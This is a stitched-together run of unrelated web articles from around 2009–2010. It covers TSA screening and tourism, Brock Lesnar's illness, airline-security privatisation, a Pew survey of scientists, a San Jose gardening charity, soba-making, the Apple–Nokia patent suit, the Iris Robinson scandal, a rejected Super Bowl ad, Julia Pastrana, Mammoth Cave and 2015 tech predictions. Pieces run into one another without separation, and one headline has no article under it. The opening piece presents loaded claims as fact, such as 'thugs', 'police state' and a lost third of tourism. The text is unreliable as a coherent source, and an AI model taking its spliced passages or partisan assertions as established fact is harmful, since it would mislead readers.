No less than a third of tourists vowed never to return to America after experiencing the treatment of Homeland Security officials at ports of entry .
By early 2007 , the U.S. had lost around 60 million visitors as a result of the stifling and intrusive security measures implemented since 9/11 , which were proven to be completely flawed in light of the underwear bomber incident on Christmas Day .
America has not only lost its crown as a beacon of freedom and hospitality , turning instead into a feared police state shunned by tourists , but it has also sacrificed almost a third of its tourist industry as a result of TSA and Homeland Security thugs being given the power to treat everyone who enters the country as a potential terrorist who is guilty until proven innocent .

Sprott 's John Embry Discusses The Four Horsemen Of The Financial Apocalypse
Below is the summary of the Brock Lesnar conference call that followed his appearance on SportsCenter .
-- Brock Lesnar is ready to start training immediately , and will fight the winner of Shane Carwin and Frank Mir .
If something happens to Mir or Carwin in that fight , the winner of Nogueira - Velasquez will get a shot .
-- Brock was suffering for almost a year with stomach pains and did n’t know what it was .
During training camp for Shane Carwin everything snowballed and fell apart .
He was missing full weeks of training camps .
-- Brock had diverticulosis , not diverticulitis , which is the more minor case .
One of his diverticuli ruptured , creating a hole in his stomach lining .
His body could n’t eat enough food to get nutrients , so he was operating at 60 - 80 % .
-- Brock may fight the same weekend as the next Expo .
-- Brock 's lowest moment was getting care from Canada .
" We have the best doctors in the world " in the United States , tells us he 's opposed to widespread health reform .
Doctors in Canada could n't do anything for him , it was like he was in a third world country .
Brock loves Canada and owns property in Canada , but he 'd definitely want to be in the U.S. to get care .
Restates that he loves Canadians , but he 's not a fan of their healthcare .
-- His wife saved his life by getting him out of the hospital .
She drove 100 miles an hour to get out of Canada and into the hospital in North Dakota .
He was in the hospital in Bismark for 11 days .
The doctors drained pockets in his stomach and removed 14 CC's of fluid from his stomach .
-- He left the hospital and went to Mayo for a second opinion , and they told him the same thing : he needed surgery .
They wanted to do another procedure in a month , so he went home , changed his diet and started working out .
-- What got him here was an all - protein diet , not enough fiber , so he had to change his diet entirely .
He started some natural healing medicine , and did a lot of praying .
He went and got a colonoscopy at Mayo on January 5th , and the doctors found nothing .
The doctors told him he would n't need surgery .
-- He will be back in the gym Thursday morning , and he 's going to be ready for everybody and anybody .
-- Brock : " I 'm a carnivore .
I 'm a member of the NRA .
Whatever I kill I eat .

Now he 's paying more attention to keeping a balanced diet .
-- On the bad night in Canada :
He went to sleep , and woke up in shock and cold sweat .
It was a huge problem , he did n't know where he was , and knew he needed medical help .
He was far away from the hospital , 2.5 - 3 hours from what he thought would be a good medical facility .
-- Brock refuses to disclose where he was treated .
Says he is mentioning this because he 's opposed to President Obama 's healthcare plan and he wants to disclose to the citizens of the United States how bad universal healthcare is .
Brock is speaking on the behalf of Americans , and on behalf of doctors ( He was speaking to Neil Davidson of the Canadian press at this point ) .
Machinery at the Canadian hospital was n't working , so he went to where he could have it done .
-- At his lightest , Brock was at 248 .
Today he is 273 pounds .
Brock joked the last time he weighed 248 pounds was second grade .

Brock is n't dwelling on the past , thinks he will be better than ever .
Says all the other heavyweights are shitting their pants .
-- Brock is unhappy about his camp coming out and saying things .
He wants to get rid of those people , mad about them speaking on his behalf .
Brock is a private guy .
He did n't want to talk to anyone before because there was nothing to say .

Ron Paul and other Libertarian minded people have suggested airline security should be left to the airlines and not the TSA .
What would the airline industry be like if security was left to the airlines ?
How would the free market natural evolution process change an airline industry responsible for their own security ?
Insurance companies would set their rates based upon an airlines security procedures .
Higher insurance rates would push airlines to improve security to bring their costs down .
Restaurants can refuse service on the basis of safety , welfare or well - being of other patrons ; airlines could refuse service for the same reasons , if a passenger is deemed a security risk .
There would be a list of airlines with the fewest number of terrorists incidents .
Consumers would weigh for themselves how much they are willing to pay for security .
Some airlines would advertise themselves as being the most secure way to fly .
There would be a market for the security - conscious people who are willing to pay more for better security .
Less secure airlines would run themselves out of business , because people would be unwilling to fly with them .
Possible security features airlines might offer if they were in charge :
Pre-screening of passengers with a security background check .
Passengers and carry - ons scanned more than once .
I double check my work ; why not double check screeners ?
Security stations on - board planes with armed guards .
Security cameras to monitor all passengers .
Security cameras monitor people in department stores now , so why not on airplanes ?
For the less expensive airlines without on - board security officers , airlines might try the following :
Carry - ons locked in the overhead bins or no carry - ons allowed at all .
Seats going sideways with lap bars ( like those found on roller coasters ) to keep everyone seated .
Only allowed to get out of seats when escorted by a crew member .
Taking the TSA out of air travel would be safer , because it is in the airlines ’ own interest to improve security .
Consumers would be more informed about the risks involved in flying .
Consumers could weigh for themselves the inconvenience and loss of privacy from security measures vs. safety .
In the long run , costs associated with security would come down because airlines would have motivation to create cost - effective and efficient security procedures .
Weighing the TSA ’s motivation of improving security when something goes wrong vs. the airline industries self - preservation motives to improve security , the scale of safety tilts towards the airline industry .

The Atlanta Journal - Constitution reports on these interesting statistics :
According to a survey of American Association for the Advancement of Science members , conducted by the Pew Research Center in May and June , a majority of scientists ( 51 percent ) say they believe in God or a higher power , while 41 percent say they do not .
Furthermore , scientists today are no less likely to believe in God than they were almost 100 years ago , when the scientific community was first polled on this issue .
In 1914 , 11 years before the Scopes “ monkey ” trial and four decades before the discovery of the structure of DNA , psychologist James Leuba asked 1,000 U.S. scientists about their views on God .
He found the scientific community evenly divided , with 42 percent saying that they believed in a personal God and the same number saying they did not .
. . .
But the scientific community is much less religious than the general public .
In Pew surveys , 95 percent of American adults say they believe in some form of deity or higher power .
And the public does not share scientists ’ certainty about evolution .
While 87 percent of scientists say that life evolved over time due to natural processes , only 32 percent of the public believes this to be true , according to a different Pew poll last year .
Once a month , Rosa Lopez lined up with her youngest child in tow for free food at a San Jose charity .
Cheerful volunteers gave them grocery bags with bread , soup cans , rice , peanut butter and a few vegetables .
Gracias , goodbye , see you next time .
But this dreary hunger routine changed for the better when she met a stocky , middle - age Latino professional who lived nearby .
He had come to the charity with novel idea :
In a city blessed with sunshine , he wanted to teach poor families like hers how to grow food in their backyards .
“ We had to try something because money and food was running out , faster than before , ” Lopez said in Spanish .
And the man with the idea needed something new in his life , too .
Raul Lozano had just left a prestigious job as the executive director of Teatro Vision , one of the oldest and most successful Latino theater companies in the country .
“ I was burned out and had my fill , ” Lozano said about the fundraising side of show business .
At 55 , he was n’t set for retirement , either .
“ I had no idea what I was going to do next .
Some people thought I was crazy . ”
But in less than a year , Lozano ’s idea , La Mesa Verde ( The Green Table ) , has sprouted faster than a happy cabbage , winning over funders and volunteer gardeners eager to work directly with families who ca n’t afford healthy , organically grown food .
On a recent warm day , Lozano visited the Lopezes , who live just south of San Jose State University .
Sugar peas , butter lettuce , red and white Spanish onions , cauliflower and other veggies filled the 4 - by - 8 - foot planter boxes , which Lozano gave them .
With four children of their own , the Lopezes live in a small house with two other families , 14 people in all .
The modest harvest wo n’t eliminate Lopez ’s trips to the food pantry , but it does save the family the cost of fresh vegetables it would otherwise have to buy at the market .
“ This is saving us quite a bit of money , ” said Arturo Lopez , a wall - framer who has n’t worked since injuring his back last year .
“ Our children are eating better .
They come back here and eat a leaf of lettuce like candy . ”
What Lozano really wanted to know was if the Lopezes were picking and eating the vegetables on time .
He noticed that the broccoli and Swiss chard were ripe but uncut .
“ I do n’t know anything about broccoli , ” Arturo told Lozano .
“ I was going to cut it and then pull it out . ”
Lozano laughed in a kindhearted way .
Each broccoli plant , he explained , will yield several heads before it gives out .
But what about Swiss chard , a tall , leafy green ?
“ I thought it was a beet ! ” Arturo said .
“ I was waiting for the root to appear and dig it up . ”
This time Lozano laughed hard , but not at Lopez .
“ Hey , I do n’t eat chard , either , ” he said in Spanish and again in English .
“ We Latinos do n’t eat chard .
I was looking for culturally relevant seeds , but when they give you chard seeds at a discount , you take them . ”
Lozano never planned a career on stage or soil .
Born into a farmworker family in the Central Valley , he moved to the Bay Area after high school and found employment with social service agencies .
After he helped some Teatro friends build a stage , they invited him to join the board when the company incorporated as a nonprofit .
He became executive director in 1999 — just in time for the dot - com crash and harder fundraising times for nonprofits .
Still , he grew the company ’s budget from $ 180,000 to $ 900,000 .
Teatro Vision became the resident company at the city ’s Mexican Heritage Plaza , specializing in plays about Latino life in the United States and showcasing new talents like playwright Octavio Solis .
“ We certainly did n’t want him to go , ” said Brendan Rawson , a Teatro board member and close friend of Lozano .
“ But he worked so darn hard at Teatro , he wore himself down . ”
Without knowing it , Lozano was seeding a new career as he worked in his garden , wondering what he could do next .
His farmworker and social worker past seemed to call out to him .
He weighed the poverty in his Latino and immigrant neighborhood , which is nicknamed Barrio Horseshoe .
Bingo .
“ Why ca n’t somebody teach the people in my neighborhood to grow food ? ” Lozano asked himself .
“ Why ca n’t that person be me ? ”
He took the idea to Fred Ferrer , director of the Health Trust , which funds dozens of anti-poverty nutrition projects in Silicon Valley .
“ Everybody does school or community gardens , but nobody was talking about growing food in backyards , ” Ferrer said .
“ When Raul asked for $ 30,000 , I told him to ask me for $ 50,000 . ”
He did , and Ferrer wrote the check on the spot .
Then Lozano asked Sacred Heart Community Service to be his nonprofit sponsor .
The charity loved his idea so much , it took on La Mesa Verde and hired him as project manager .
“ I was sold immediately on the idea , ” said Poncho Guevara , Sacred Heart director .
“ But I knew this would be a whole new initiative , not just one guy with a truck and wheelbarrow . ”
Actually , Lozano did n’t have a truck , but he sure could use one or two now .
For more help , he approached the master gardening program at the University of California Extension school .
He had taken its basic gardening class years before .
“ This fits in with what we want to do , ” said Karen Schaeffer , the master gardener who designed the program ’s first planting .
“ It ’s an obviously great idea , the classic teaching somebody to do it themselves as opposed to just giving it to them . ”
When the master gardener program signed on , La Mesa Verde brought two different communities together — educated , English - speaking and mostly white volunteer gardeners at the front of the green movement with low - income , Spanish - speaking Latinos just struggling to survive .
La Mesa Verde is more than planting and eating .
Master gardeners will serve as mentors , visiting each family twice a month .
The 30 families so far must attend classes on organic gardening and nutrition , all at no cost .
Rosa Lopez can’t wait for summer and tomatoes , and she ’s more than happy to learn what to do with chard .
“ We ’re already cooking with less grease , ” she said .
“ The chard , I ’m sure we ’ll make something really good with it . ”
Lozano ’s goal is to have 5,000 families — and 10,000 planter boxes — enrolled in La Mesa Verde before he retires , whenever that is .
One day , he hopes , the families will be able to grow more organic vegetables than they can eat , and donate the healthy surplus to a local food bank .
“ I ’m a lucky man , ” Lozano said .
“ I ’ve had one great career by accident and I ’m starting a new one by accident . ”

Reporting from Tokyo and Los Angeles --
At Akila Inouye ’s Tsukiji Soba Academy in Tokyo , a specially made wooden cabinet has 108 small cubbyholes , each containing a scroll of thick brown or green paper printed with a question .
“ How to finish the soba dough so that the surface is completely smooth ? ” “ What is the ideal shape of soba cutting knives ? ” “ How difficult is it to mill buckwheat flour oneself ? ”
The soba instructor ’s cabinet of questions is emblematic of the nuances of soba - making .
Soba , revered in Japan -- especially on New Year ’s Eve , when it ’s eaten as a symbol of longevity -- is one notoriously tricky noodle .
It ’s difficult to make well , so that it ’s supple , lustrous and slurpable , resilient and slightly chewy , with the fresh , earthy flavor of buckwheat .
But there is hope for beginners , an opportunity for the would - be casual soba maker ( who is n’t steeped in the ways of michi , or strict adherence to tradition ) to mix , roll and cut the noodles entirely by hand .
It ’s an easy method prescribed by Inouye , who has studied the intricacies of soba - making for more than 20 years and describes himself as a soba evangelist .
Call it “ intro to soba ” ; all you basically need is stone - milled buckwheat flour , a plastic bag , a rolling pin and a sharp chef ’s knife .
According to the lore of Japanese cooks , it takes three years to perfect the subtle art of turning just buckwheat flour , wheat flour and water into elegant skeins of noodles : one year to learn to mix the dough , the second to learn to roll , and the third to learn to cut the slender noodles by hand .
Because buckwheat flour does n’t have any gluten ( the matrix of proteins that holds dough together ) , mixing and kneading soba dough to its precise consistency and smoothness requires experience .
But , Inouye says , there ’s a big difference between making two servings and making 12 servings , and using his technique , even the uninitiated can make two servings of fresh soba that will be better - tasting than dried , packaged noodles .
“ Everybody can make fine soba at home , ” he says .
Inouye opened his school , located near the Tsukiji fish market on the third floor of an office building on a quiet street -- practically in the shadow of Honganji Temple -- in October 2002 .
After leaving a career as a graphic designer , he hoped to teach aspiring professionals so “ they can open [ soba ] restaurants around the world . ”
“ The main reason is I love soba , ” says Inouye , who is 56 with salt - and - pepper hair and a gentle face .
His students ( whom he occasionally commends by saying , “ You ’re a good soba - tician . ” ) are a mix of mostly home cooks and some potential soba masters enrolled in one - day , weekend or four - to six - week courses .
Soba is venerated for its simplicity but is more than the sum of its parts , he says .
And each aspect of the process of making soba affects the outcome .
The movements of a soba master are exacting .
To make soba the traditional way , Inouye starts with freshly milled flour from newly harvested buckwheat that has been cultivated in cold , arid regions of Japan such as Hokkaido , Aomori , Yamagata or Fukushima .
A small mill stands near the entrance of the classroom , its two granite wheels grinding a kernel of buckwheat at a time ; it produces only enough flour to make soba for the school ’s restaurant service , Inouye says .
For New Year ’s Eve , he ’ll make 300 servings of soba to give to customers .
“ Actually , this is not a remarkable amount for a soba maker , ” he says .
“ Some people make over a thousand servings for the day . ”
He mixes the dough ( using a ni-hachi , or 2 - to - 8 , ratio of wheat flour to buckwheat flour ) in a black lacquer bowl bigger than a baby ’s tub , swirling the mixture first with his fingertips and then his palms to incorporate all of the water into the flour .
“ It ’s most critical so every particle of flour meets the water , ” he says .
He starts kneading , pressing firmly on the dough with the heels of his hands , making sure the water is absorbed deep into the dough and the final disk of dough feels “ smooth as a baby ’s cheek . ”
Using a set of four long rolling pins called menbo ( his are made of lacquered wood and acrylic ) he begins rolling the dough on a cypress board dusted with uchiko , a type of buckwheat flour .
The menbo are of varying lengths and diameters and are used in turn at different stages of the rolling process .
His hands are curled into fists , the heels of his hands placed on top of the menbo , moving it back and forth as a look of deep concentration settles on his face , his body swaying and feet moving in a complex shuffle and sweat forming on his brow .
Soba dough makes you work for it .
He produces a thin , wide sheet of dough , nearly the size of a bath towel and no thicker than a quarter , folds it into eight layers and starts cutting with a tall , thin - bladed steel cleaver called soba - kiri .
Keeping the cleaver as upright as possible , he cuts quickly , guided by a board .
After each cut , he angles the soba - kiri almost imperceptibly to move the guide across the dough .
The knife hits his cutting mat rhythmically ; “ it should be the sound of horses trotting , ” he says .
And what he ends up with is more than 2,000 identical , perfectly julienned strands of delicate soba -- the final product of a technique that has been honed over decades .
Now , soba the easy way : During a recent visit to L.A. , Inouye also demonstrated his method for those who want to try their hand at soba .
The key is to make a small quantity so that no special equipment ( or years of refined technique ) is needed .
Inouye mixes all - purpose and buckwheat flour -- still using the 2 - to - 8 ratio -- along with some water in a plastic bag .
He likes using a plastic bag because it ’s convenient and helps keep in moisture ( you could instead use a bowl ) .
Twisting the bag closed , he starts squeezing it to combine the flour and water thoroughly .
He removes it from the bag and begins kneading .
The type of buckwheat flour you use is paramount to the success of your soba ( which in Japanese means both “ buckwheat ” and “ buckwheat noodles ” ) .
The way the buckwheat is harvested , threshed , dried and milled all play a part in determining whether the flour can be used for soba .
You ca n’t use Bob ’s Red Mill buckwheat flour , for example ( we tried and ended up with a wet , sandy mixture instead of smooth dough ) .
But stone - milled buckwheat flour from Cold Mountain worked well and is available at select Japanese markets .
He continues to knead , using the heel of his hand and his palm to fold the dough onto itself , rolling it forward .
“ Little by little the dough is getting smoother . ”
He pushes the dough down into the thinnest possible disk , using his palm and putting all of his weight on it .
With a rolling pin , he rolls the dough into an oval and then a rectangle while dusting uchiko flour onto his board ( uchiko is difficult to find , so Inouye recommends substituting cornstarch ) .
He folds the dough , rolled to about one - sixteenth - inch thick , into quarters and cuts the noodles with a sharp Japanese vegetable knife ( we tried it with a sharp chef ’s knife , which works well too ; a heavy cleaver had too thick a blade ) .
Using a slight rocking , or “ pitching , ” motion , he quickly cuts exquisitely thin , even slices ( skill comes with practice ) .
The soba is boiled for just a minute to 90 seconds .
Save the cooking liquid , or sobayu , to add hot to the tsuyu dipping sauce to drink as a soup at the end of the meal .
After the soba is boiled , it is shocked in an ice bath to stop the cooking and then dipped into another ice bath to remove all of the surface starch and complete the cooling ( soba cooking is a series of hot and cold baths ) .
Soba connoisseurs eat their noodles unadorned , presented on a zaru , or flat wooden strainer , with a dashi - and soy - based dipping sauce on the side and condiments such as sliced green onions , grated daikon , wasabi and togarashi .
A creamier dipping sauce is made with ground walnuts and tsuyu .
It ’s worth going to the trouble of making soba to get fresh , elastic , toothsome noodles that sing with the flavor of buckwheat .
Most dried , packaged soba is made with as much as 70 % wheat flour .
Buckwheat flour should be the first ingredient listed ( and when it is , it can be expensive ) .
It may take a little practice , but all soba masters have to start somewhere .
“ The first time I tried to make soba , they were not noodles , ” Inouye says .
“ But the second time , great results .
I thought , maybe I ’m a great soba maker . ”

" Other companies must compete with us by inventing their own technologies , not just by stealing ours , " said Bruce Sewell , Apple 's General Counsel and senior vice president .
As Anssi Vanjoki , Nokia 's executive Vice President and General Manager of Multimedia , stated at Nokia 's GoPlay event in 2007 when asked about the similarities of Nokia 's new offerings to the already released iPhone : " [ i ] f there is something good in the world , we copy with pride . "
True to this quote , Nokia has demonstrated its willingness to copy Apple 's iPhone ideas as well as Apple 's basic computing technologies , all while demanding Apple pay for access to Nokia 's purported standards essential patent .
So much for making nice .
Apple just announced that it 's countersuing Nokia for infringing thirteen of its patents -- slightly upping Nokia 's claim that Apple 's infringing ten .
We have n't seen the case yet , but we 'll post it up for you as soon as we find it -- and as we predicted in our breakdown of Nokia 's complaint , this is shaping up to be a long and costly nightmare of a suit .
Hey , do you think Apple general counsel Bruce Sewell might have a crazy lightning rod of a statement about the case for us ?
Cool , thanks .
We 'll be in the corner under a Nomex blanket for the next few months .
Here 's the PDF of the reply -- we 're still reading all 79 pages of it , but it's what we expected : Apple says Nokia 's patents are n't actually essential to GSM / UMTS , denies infringing them , and says they 're invalid and / or unenforceable anyway .
Apple also says Nokia wanted unreasonable license terms for the patents , including a cross-license for Apple 's various iPhone device patents as part of any deal , which Apple clearly was n't willing to do .
That 's in stark contrast to what Nokia says it wants in its lawsuit -- all it's asked the court for is past due license fees on its patents .
( Which is odd , if you think about it : Nokia would n't come to terms on a license that did n't include iPhone patents , but it 'll spend the cash on litigation for past due fees ?
That seems silly . )
Oh , and if you 're just in this for the bitchy quotes , here you go :
We 'll let you know if we see anything else of interest , but we 'd say we 're in for a long , bumpy ride here .
DUBLIN , Ireland ―
The political crisis in Northern Ireland arising from a dalliance between a 59 - year - old woman and a teenager has underlined the fragility of the power - sharing arrangements that were beginning to be taken for granted .
The affair , between Iris Robinson , wife of Northern Ireland ’s First Minister Peter Robinson , and 19 - year - old Kirk McCambley , has pushed Mr. Robinson to the point of resignation .
If this were to happen , the whole edifice of shared government , painstakingly negotiated over years with the help of former U.S. Sen .
George Mitchell and the British and Irish governments , could fall apart .
But the real issue here is not the sex scandal but the question of policing .
Peter Robinson heads the pro-British and mainly Protestant Democratic Unionist Party ( DUP ) and governs Northern Ireland along with Deputy First Minister Martin McGuinness of Sinn Fein , which aspires to a united Ireland .
Under the power - sharing deal , control of police and justice was to be devolved to the joint administration by the British Government .
It was this promise that enabled Sinn Fein to persuade its followers to accept the partition of Ireland , for now , and enter a government in Belfast .
Unionists , however , are deeply unhappy at the idea of Sinn Fein — the political wing of the now - disarmed IRA — having any say in police matters .
Peter Robinson has resisted pressure from London and Dublin to complete the process but there was an assumption that he would in time .
The same cannot be said of any likely successor , since those breathing down his neck are more hard - line in their opposition to devolved policing .
Kirk McCambley , 21 , leaves the Lock Keepers Inn , in south Belfast .
Paul Faith / PA Wire
The DUP is now in a terrible quandary .
If it jettisons Peter Robinson and proposes a new First Minister unacceptable to Sinn Fein because of his or her opposition to devolved policing , then the power - sharing government falls and there will be a new election .
However it would be awkward for the DUP , with its base of Protestant supporters who have conservative religious convictions , to canvass for votes in the wake of such a devastating sex scandal .
Much depends on whether Peter Robinson can survive allegations that he acted improperly in dealing with the financial aspects of the mess .
Iris Robinson , herself an elected member of the Northern Ireland assembly , obtained 50,000 pounds ( $ 81,000 ) from two property developers in 2008 to enable her young lover to launch a cafe .
She failed to declare the gifts as required by law .
The BBC , which broke the story last week , claimed that Peter Robinson also knew she had broken the rules and did not inform the authorities .
Peter Robinson has asked a government lawyer to determine within a week if he is guilty of wrongdoing , and will resign if found at fault .
On Sunday Robinson asked a party colleague , Arlene Foster , to step in temporarily as First Minister , a procedural device while he tries to clear his name .
Earlier , DUP colleagues gave Robinson a vote of confidence pending the outcome of the inquiry by the government lawyer into his actions .
The sex scandal has mesmerized Northern Ireland , particularly as Iris Robinson was a strident critic of other people ’s moral standards .
In the wake of the beating of a gay man in Belfast she notoriously declared that homosexuality was an “ abomination . ”
Her own affair began after her close friend , a Belfast butcher named Billy McCambley , just before he died in February 2008 asked her to look after his son , Kirk .
Iris Robinson 's friendship with Kirk developed into a sexual relationship and in June 2008 she arranged for her lover to set up a cafe beside a 200 - year - old lock - keeper ’s cottage on the river Lagan .
Mrs. Robinson persuaded two property developers , Fred Fraser and Ken Campbell to give her 25,000 pounds ( $ 40,500 ) each in checks made out to Kirk to start the business , and took 5,000 pounds ( $ 8,100 ) in cash for herself .
When the young man , who is now 21 , broke off the affair in December 2008 , Iris Robinson demanded that he return the money .
Negotiations were conducted through her political adviser Selwyn Black , who quit when he became fully aware what was going on and went to the BBC with the story .
He provided a record of text messages and phone calls that indicate that Peter Robinson knew about the financial maneuvers .
One text dated Jan. 14 , 2009 from Iris Robinson to Black said that her husband “ knows about the money … and he is attempting to keep his hands clean . ”
Iris Robinson announced two weeks ago that she was quitting politics , and rumors of a scandal circulated until Jan. 7 , when Peter Robinson gave an extraordinary interview to selected journalists in which he disclosed that his wife had had an affair and that he had forgiven her .
He claimed he first knew about it on March 1 , 2009 , following which his wife attempted suicide .
The next day the BBC revealed the complete story .
To make matters worse for Peter Robinson , it turned out that on the same day as Iris was being taken to hospital after attempting suicide , he took questions at the assembly in his capacity as First Minister and a video clip of him making a joke as he did so has portrayed him as cold and heartless .
Irish Robinson has not been seen since the scandal broke but her husband claims she is getting treatment for psychological problems .
CBS has decided it will not air an advertisement from gay dating website ManCrunch.com during Feb.
7 ’s Super Bowl XLIV , EW has confirmed .
The ad depicts two football - watching men sharing a passionate kiss after their hands touch while reaching into a bowl of potato chips .
“ After reviewing the ad — which is entirely commercial in nature — our Standards and Practices department decided not to accept this particular spot , ” a network rep said in a statement .
“ As always , we are open to working with the client on alternative submissions . ”
A rep for ManCrunch.com also confirmed the rejection and called the refusal to air the spot hypocritical .
“ We are totally of the opinion the ad was rejected due to the homosexual content , ” spokeswoman Elissa Buchter said .
She added , “ The creative is PG - rated and does n’t feature any tongue or overt sexuality . ”
In a commercial clearance report form ( provided to EW by ManCrunch.com ) , CBS notified the website that its ad had not been approved , stating that the creative content was not within in the Network ’s Broadcast Standards for Super Bowl Sunday .
The report also questioned the company ’s finances .
“ Our Sales Department has had difficulty verifying your organization ’s credit status , ” the form states .
“ Should you wish to explore future buys on the CBS Television Network , the credit issue will have to be clarified . ”
A 30 - second spot during this year ’s Super Bowl costs an estimated $ 2.6 million .
Super Bowl advertising is often controversial and ads are routinely rejected , which has fueled speculation that this could be a ploy by ManCrunch.com to generate free publicity without ever actually intending to purchase air time during the game .
ManCrunch.com , however , claims that ’s not the case .
“ ManCrunch not only had the money to pay for the spot , they even offered CBS a cash advance , ” the company stated .
The CBS rep told EW : “ We have absolutely no record of any such offer . ”
CBS and its Super Bowl commercials made headlines earlier this week when women ’s advocacy groups issued statements protesting the network ’s decision to air a spot sponsored by Christian organization Focus on the Family , which features Florida Gators football star Tim Tebow , his mother , and what some are arguing is an overt pro-life message .
“ At CBS , our standards and practices process continues to adhere to a process that ensures all ads — on all sides of an issue — are appropriate for air , ” the network said in response to that flap .
“ We will continue to consider responsibly produced ads from all groups for the few remaining spots in Super Bowl XLIV . ”
Julia Pastrana was born in 1834 .
She arrived , steeped in mystery , and her life was as strange and sad as her birth .
She was believed to have been born within a small tribe of Native Americans on the western slopes of Mexico .
Not a lot is known about her early childhood , but she first appeared in public , when , in 1854 , she was brought out and exhibited at the Gothic Hall on Broadway .
The name she was billed under was a cruel and sad insult to her condition .
Known as the marvellous hybrid or Bear Woman , others called her The Ugliest woman in the World .
Her handler or owner was named as a Mr M. Rates and he saw the potential in her the second he found her , working as a servant girl to the governor of Sinaloa Mexico .
Realising that she would earn him lots of money , he decided to start showing her to the public , A quote from the time stated her as , The Great Freak of Nature .
The newspapers of the day said she was hideous , but in her favor she had a very nice singing voice .
To the public eye , she did have a very strange appearance .
Her body was covered in hair , and her face even more so .
A Jutting jaw and very swollen gums added to her appearance .
At four and a half feet , she was also said to look very like an ape in features .
But she had dignity .
Standing in front of an audience of thousands , Julia looked down at the audience and sang in a most beautiful voice .
She had great poise .
She was aware of the fact that she was different but used her small frame and powerful persona to her advantage .
The scientists of the day thought that she was a hybrid between human and orangutan , and believed that they had found a missing link .
After moving to Cleveland with another new promoter , J.W. Beach , Julia began to turn the tide around and , charming the public with her grace , she began to get very well known , even being invited to grand balls and military gala's .
On one of these occasions , she was given the honour of dancing with the soldiers , who lined up to have the chance to dance with this unique but strange human being .

Mammoth Cave National Park is a U.S. National Park in central Kentucky , encompassing portions of Mammoth Cave , the longest cave system known in the world .
The official name of the system is the Mammoth - Flint Ridge Cave System for the ridge under which the cave has formed .
The park was established as a national park on July 1 , 1941 .
It became a World Heritage Site on October 27 , 1981 , and an international Biosphere Reserve on September 26 , 1990 .
The park 's 52,835 acres ( 21,382 ha ) are located primarily in Edmonson County , Kentucky , with small areas extending eastward into Hart County and Barren County .
It is centered around the Green River , with a tributary , the Nolin River , feeding into the Green just inside the park .
With a confirmed 365 miles of passageways it is by far the world 's longest known cave system , being well over twice as long as the second longest cave system , which is South Dakota 's Jewel Cave with 145 miles of passageways .
Mammoth Cave developed in thick Mississippian - aged limestone strata capped by a layer of sandstone , making the system remarkably stable .
It is known to include more than 360 miles ( 580 km ) of passageway ; new discoveries and connections add several miles to this figure each year .
Mammoth Cave National Park was established to preserve the cave system .
The National Park Service offers several cave tours to visitors .
Many of the most famous features of the cave , such as Grand Avenue , Frozen Niagara , and Fat Man's Misery , can be seen on lighted tours ranging from one to six hours in length .
Two tours , lit only by visitor - carried paraffin lamps , are popular alternatives to the electric - lit routes .
Several " wild " tours venture away from the developed parts of the cave into muddy crawls and dusty tunnels .

I read a fair bit of technology news and discussion online , its a kind of hobby of mine – around this I make sweeping statements about what I think things will end up like .
While a fairly pointless thing to do its interesting to note what you think things will be like in the future at one point , even if in 2015 I find this post ( how will I find it ? ) and laugh at its outlandish predictions about technology and society .
So here goes , my thoughts on what technology will be like for humans in 2015 .
The reason this post really sparked was this post on pico projectors and what pico projectors might be like in 2015 .
I think pico projector ’s ( tiny projectors that will fit in your hand but produce a projection pretty much the quality of your old tv , anywhere @ 50 inchs ) will get huge .
I do n’t doubt for one minute that MVIS stock will be the first sign of this in the coming months ( the microvision showWX is going to be the worlds first mainstream big selling pico – prediction ) and this will be only the start for developing display technology .
Over the next 5 years visually representative technology will blossom .
We will see embedded pico - projector ’s slot into city planning , home design , products such as laptops ( netbooks ) , mobile phones , games systems , camera’s .
Within lcd little growth will happen but we will likely see some sort of “ ultra hd ” – probably double current full hd ( 1080 p ) , while embedded pico ’s will feature a whole host of new resolutions , by 2015 we will definitely see full hd pico’s .
This development of display technology will usher in a new age of advertisements , coupled with Augmented Reality and revolution amongst the Operating Systems .
Which brings me nicely to Augmented Reality .
AR .
Currently there is much buzz around Augmented reality , which I believe really is the sudden sci- fi geek realisation that technically the technology to fully provide AR is out , its been out for more than a year .
Smart phones with knowledge of where they are and decent digital cameras have been around longer than the iPhone .
It seems once this dawned on people everyone made a mad rush to make something AR , regardless of what it is .
As a result magazines , advertisers and marketing companies largely came first ( presumably they had the quickest fluid funds to pay for AR . )
This marrs the technology a bit if you ask me but perhaps as AR becomes more meaning based this will change .
My jury is out on AR but I think it wo n’t be as big a deal as everyone is making out it will be .
Business will change , or rather some business ’s will change the way they use technology .
You always get early adopters but I believe a good proportion of companies that operate around creative , co-operative ideology will gear up more technologically as the younger generation come into professionalism .
We will see different technological assistance of work in the workplace .
Board meetings will not only be worldwide ( like now via Cisco tele - conferencing ) but they will be assisted by interactive technology , touch and display will play large parts in this technology , beyond the Microsoft surface table and towards the science fiction of minority report .
Data will be housed , represented and communicated differently .
A few years ago usb sticks and solid state drives did n’t offer an easy solution to copying files , network speeds were a 100th of what they largely are today , there was no cloud .
As data management and storage develop as too will the way we use it .
We will probably have identifiers rather than storage in 2015 .
e.g. rather than copying a file to a usb stick you will simply instruct your interface to relate that data to a physical object , a soundwave ( a word / phrase perhaps ? ) or a time of day or place , provided you can prove who you are you could then recieve it .
You could carry a 200 gb file with you in your wallet or on your fingernail , as the likelihood is that 200 gb file will be stored centrally in what people now call the “ cloud ” ( but will probably be a server in london or a main city ) and you will simply use a relation to prompt whatever interface into providing you with this file .
There will be hurdles in achieving universal centralised data but by 2015 there will be a huge proportion less of personal computing power stored in the home .
The google OS is perhaps a sign of a branching of operating systems , but I do n’t see google dominating the operating system market .
Microsoft have become a lot stronger over the last 18 months but the real truth of it is that neither of these developers seem to be truely embracing all of the technology developments happening .
Perhaps this lag in uptake is natural , Microsoft does show some promising signs but is held back by business concerns , google seems to throw itself into the ideas without checking they are in the right direction , linux , well linux is linux .
By 2015 I predict there will be at least another major world provider of what we currently refer to as operating systems .
The whole concept needs re-exploring from the ground up , even starting again beyond the google os .
Touch for example , AR and improved options for display are all completely ignored by all of the aforementioned operating systems , Microsoft is the only developer that even references these things but is yet to truly develop a commercial option .
Search will change too .
The last few years has seen a huge uptake worldwide in searching for things which in turn has pushed marketing , sales and online business into a whole new age .
It ’s also cemented new business models such as affiliate marketing , search based advertising and more grey area web production .
The long tail has well and truly become a reality , many successful business people spend their days driving traffic from long tail search into successful sales .
This will continue but it wont settle in a single routine for long .
Affiliate marketing will take to interactive media more as this becomes more integral in everyday life , search will some how adapt to a new more astute audience that is used to getting good search results fast and who quickly picks up trends and becomes integral members of up and coming online phenomena such as reddit , twitter etc .
